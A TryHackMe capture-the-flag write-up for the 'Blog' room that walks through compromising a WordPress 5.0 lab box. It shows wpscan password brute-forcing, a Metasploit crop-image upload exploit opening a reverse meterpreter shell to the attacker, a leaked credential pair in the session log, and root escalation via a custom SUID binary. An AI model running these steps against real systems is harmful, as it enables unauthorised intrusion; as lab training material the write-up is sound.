# Try Hack Me Writeup - Blog

- TryHackMe room: <https://tryhackme.com/room/blog>
- OS: `Linux (Ubuntu)`

Billy Joel made a Wordpress blog!

![alt text](files/writeup-image.png "Writeup Image")

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.

Credit to [Sq00ky](https://tryhackme.com/p/Sq00ky) for the root privesc idea ;)

**WARNING: I stripped out the answers, passwords, flags and co. This writeup is pretty detailed. By following and doing the steps described here yourself you will get them all. The goal is to learn more about it, even if you get stuck at some point. Enjoy!**

## Table of Contents

- [Answer the questions](#answer-the-questions)
- [Setup](#setup)
- [Tools Used](#tools-used)
- [Enumeration of ports and services](#enumeration-of-ports-and-services)
- [Enumerating the website](#enumerating-the-website)

## Answer the questions

root.txt

    9a*****18bef9bfa7ac28c135*****18

user.txt

    c8*****9aae571f7af486492b*****b7

Where was user.txt found?

_Hint: HINT 1, IF THERE IS_

    [REDACTED]

What CMS was Billy using?

    [REDACTED]

What version of the above CMS was being used?

    [REDACTED]

## Setup

```commandline
$ export IP_TARGET=10.10.195.82
$ export WRITEUP="$HOME/Documents/THM/blog/"
$ mkdir -p $WRITEUP
$ cd $WRITEUP
$ tmux
```

## Tools Used

| Name | Usage |
|---|---|
| `nmap` | Port & services enumeration |
| `wpscan` | To brute force the WordPress login |
| `msfconsole` | To exploit WordPress |
| `strings` | To examine files |
| `ltrace` | To trace library calls |

## Enumeration of ports and services

Let's start with a classic `nmap` scan.

````commandline
# nmap -sCV $IP_TARGET 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-29 19:18 CEST
Nmap scan report for 10.10.195.82
Host is up (0.036s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2021-08-29T17:18:28+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-29T17:18:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
```` 

There are a few interesting things in the scan result, but like the CTF goes about a blog, I will first look at the website, and if really needed, take a closer look to this `samba` server.

## Enumerating the website 

Looking at the website, and according to the `nmap` scan, this is about a `WordPress 5.0` website. The website looks simple. On the home page, we see the last post made by `Karen Wheeler` which seems to be the mother of `Billy`. When hovering the cursor over the name, which is a link, we see the username. That's actually the user id used by `WordPress` to log in. The blog post is dedicated to her son `Billy`. We see 2 comments and get the full name of `Billy Joel`. There's another post, which seems to be the first post of the blog, a `Welcome!` post made by `Billy Joel`. We see also his username. 

![alt text](files/webserver_01.png "Webserver")

As we have 2 usernames, let's save them!

````commandline
echo "[REDACTED]" >> usernames.txt
echo "[REDACTED]" >> usernames.txt
````

As this seems to be a fairly simple website, and from the info we have so far. We could try to brute force this. This sound crazy as we barely gathered information so far. For this we can make use of `wpsccan`, but we absolutely need to make use of the argument and flag `--password-attack wp-login`. Otherwise, it will try different login methods and will be as slow as a `hydra` attack on `WordPress`.

````commandline
wpscan -U usernames.txt -P /usr/share/wordlists/rockyou.txt --password-attack wp-login --url http://10.10.207.227
````

After a few minutes, got the `WordPress` password for the user `[REDACTED]`, but this user seems to be just a user, without admin rights. Shoot, no fancy web shell today! We need super cow power to get something done.

Have redone the same user attack with `wpscan` on the other user `[REDACTED]`, but after a bit more than `10.000` different passwords attempts with the `rockyou.txt` file, I have given it up. For CTFs, it usually does not last that long. Also ran a `gobuster` enumeration, but that computer showed me his middle finger in the middle of the way. Or maybe he had no time to do that. He passed away for sure without banning me. That virtual Ubuntu computer seems not to be very stable. So fired up a new one. So if I forgot to change IPs in this writeup, you know why. So started over again some parts. At the same time the computer was thinking hard about passwords, I was looking around and found maybe something interesting in the [exploit-db](https://www.exploit-db.com/) with reference [EDB-ID46662](https://www.exploit-db.com/exploits/46662), about an interesting vulnerability [CVE-2019-8943](https://nvd.nist.gov/vuln/detail/CVE-2019-8943), [CVE-2019-8942](https://nvd.nist.gov/vuln/detail/CVE-2019-8942).

For this we need to use `msfconsole`. So let's go and use that module. We need to set the different variables; `USERNAME`, `PASSWORD`, `RHOSTS`, `LHOST` and then just fire the exploit and we get a remote meterpreter shell.

````commandline
msf6 > search wordpress 5.0

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce               2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1  exploit/unix/webapp/wp_property_upload_exec  2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/webapp/wp_property_upload_exec

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  [REDACTED]       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set RHOST 10.10.207.227
RHOST => 10.10.207.227
msf6 exploit(multi/http/wp_crop_rce) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on 10.8.208.30:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to 10.10.187.73
[*] Attempting to clean up files...
[*] Meterpreter session 1 opened (10.8.208.30:4444 -> 10.10.187.73:46982) at 2021-08-29 20:46:42 +0200
````

Houston! We are in! Tried to grab the `user.txt` flag, but they played the monkey with me. Definitively, no luck today.

````commandline
meterpreter > ls /home/
Listing: /home/
===============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2020-05-26 22:08:48 +0200  bjoel

meterpreter > cd /home/bjoel
meterpreter > ls
Listing: /home/bjoel
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
20666/rw-rw-rw-   0      cha   2021-08-29 20:35:47 +0200  .bash_history
100644/rw-r--r--  220    fil   2018-04-04 20:30:26 +0200  .bash_logout
100644/rw-r--r--  3771   fil   2018-04-04 20:30:26 +0200  .bashrc
40700/rwx------   4096   dir   2020-05-25 15:15:58 +0200  .cache
40700/rwx------   4096   dir   2020-05-25 15:15:58 +0200  .gnupg
100644/rw-r--r--  807    fil   2018-04-04 20:30:26 +0200  .profile
100644/rw-r--r--  0      fil   2020-05-25 15:16:22 +0200  .sudo_as_admin_successful
100644/rw-r--r--  69106  fil   2020-05-26 20:33:24 +0200  Billy_Joel_Termination_May20-2020.pdf
100644/rw-r--r--  57     fil   2020-05-26 22:08:47 +0200  user.txt

meterpreter > cat user.txt
You won't find what you're looking for here.

TRY HARDER
````

Arf, we don't have the `user.txt` flag. Let's download that pdf file!

````commandline
meterpreter > download Billy_Joel_Termination_May20-2020.pdf
[*] Downloading: Billy_Joel_Termination_May20-2020.pdf -> /home/itchy/Documents/THM/blog/Billy_Joel_Termination_May20-2020.pdf
[*] Downloaded 67.49 KiB of 67.49 KiB (100.0%): Billy_Joel_Termination_May20-2020.pdf -> /home/itchy/Documents/THM/blog/Billy_Joel_Termination_May20-2020.pdf
[*] download   : Billy_Joel_Termination_May20-2020.pdf -> /home/itchy/Documents/THM/blog/Billy_Joel_Termination_May20-2020.pdf
````

Looking at that PDF file, looks like `bjoel` got fired from the company `Rubber Ducky Inc.`. Looking this up on the internet, and found in the first hits the `USB Rubber Ducky - Hak5`. A website who sell whatever, fancy toys for hackers. This [Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe) is about a USB key... No comments.

![alt text](files/termination_letter_bjoel.png "Termination letter bjoel")

We got a serious hint there from that pdf document and our researches, `[REDACTED]` like fancy toys.

I have looked almost everywhere, I did not put it in this writeup, but finally found where this root.txt flag could be stored. But again. No luck. only the concerned user can read it. And we are not that user yet. Dropping to a shell and a simply stabilising the shell too.

````commandline
meterpreter > shell
Process 2154 created.
Channel 9 created.

python -c 'import pty;pty.spawn("/bin/bash")'
www-data@blog:/$ ls -lh /media/
ls -lh /media/
total 4.0K
drwx------ 2 bjoel bjoel 4.0K May 28  2020 usb
````

So, back at work and let's do some local enumeration on the target machine. Looking at `sudo` will be useless, as we don't have credentials, yet. I tried, to be honest, but like said, no credentials and `sudo` asked me for it. Looking for `SUID` files, and hopefully exploit. Otherwise, I will have to transfer some fancy toys to help me and to speed up the process.

````commandline
www-data@blog:/home/bjoel$ find / -perm -u=s -type f 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
````

Nothing found on [GTFOBins](https://gtfobins.github.io/) about these, and I have no clue what `/usr/sbin/checker` actually is. Googling that did not help. Google wants to help too much in this case and show me the whole world. I have no time for that.

Running it gives `Not an Admin`. And trying to get help, just does not give any help! That's not compliant stuff there. RED FLAG.

````commandline
www-data@blog:/home/bjoel$ checker
checker
Not an Admin
www-data@blog:/home/bjoel$ checker --help
checker --help
Not an Admin
www-data@blog:/home/bjoel$ man checker
man checker
No manual entry for checker
See 'man 7 undocumented' for help when manual pages are not available.
````

That is probably some custom-made stuff. Looking with `strings` and we see some interesting things in the beginning of the output. It feels like it tries to get some environment variable. And then there's something about `admin`, then feels like to run bash... In the `GNU / Linux` world, we are not used to talk about admin, not this way.

````commandline
...
setuid
puts
getenv
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
=9       
AWAVI
AUATL
[]A\A]A^A_
admin
/bin/bash
Not an Admin
...
````

We could already try out to create this admin environment variable, actually. But let's try to look differently and with `ltrace` to figure out what library call are made.

````commandline
www-data@blog:/home/bjoel$ ltrace checker
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
````

So this file is definitively looking for an environment variable called `admin`. Let's try to set this up and run again and see what happens.

````commandline
www-data@blog:/home/bjoel$ export admin=1 
export admin=1
www-data@blog:/home/bjoel$ ltrace checker
ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
www-data@blog:/home/bjoel$ checker
checker
root@blog:/home/bjoel#
````

We are `root` user now! So let's first grab the `root.txt` flag.

````commandline
root@blog:/home/bjoel# ls /root/     
ls /root/
root.txt
root@blog:/home/bjoel# cat /root/root.txt
cat /root/root.txt
9a*****18bef9bfa7ac28c135*****18
`````

We should not forget to grab the `user.txt` flag too.

````commandline
root@blog:/home/bjoel# ls /media/usb/
ls /media/usb/
user.txt
root@blog:/home/bjoel# cat /media/usb/user.txt
cat /media/usb/user.txt
c8*****9aae571f7af486492b*****b7
````

Mission accomplished!

Hopefully you enjoyed as much as I did :-)
